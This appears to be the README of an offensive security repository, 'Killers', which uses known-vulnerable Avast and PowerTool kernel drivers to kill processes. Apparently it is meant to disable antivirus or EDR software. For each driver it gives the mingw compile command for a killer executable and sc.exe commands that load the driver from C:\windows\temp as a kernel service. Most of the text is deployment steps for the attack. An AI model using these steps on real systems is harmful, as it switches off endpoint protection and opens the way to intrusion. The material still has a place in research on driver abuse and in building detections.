# Killers

<p align="center">
  <img src="https://github.com/xalicex/Killers/blob/main/killers.jpg"  width=40% height=40% >
</p>

This is the blogpost related to this repository : https://alice.climent-pommeret.red/posts/process-killer-driver/

## Avast

https://www.loldrivers.io/drivers/57fc510a-e649-4599-b83e-8f3605e3d1d9/

```
x86_64-w64-mingw32-gcc -o avast_killer.exe avast_killer.c 
sc.exe create aswArPot.sys binPath= C:\windows\temp\aswArPot.bin type= kernel && sc.exe start aswArPot.sys
```

## PowerTool 

https://www.loldrivers.io/drivers/fe2f68e1-e459-4802-9a9a-23bb3c2fd331

```
x86_64-w64-mingw32-gcc -o PowerTool_killer.exe PowerTool_killer.c 
sc.exe create kEvP64.sys binPath= C:\windows\temp\kEvP64.bin type= kernel && sc.exe start kEvP64.sys
```
PowerTool official website : http://powertool.s601.xrea.com/

Download page : https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml
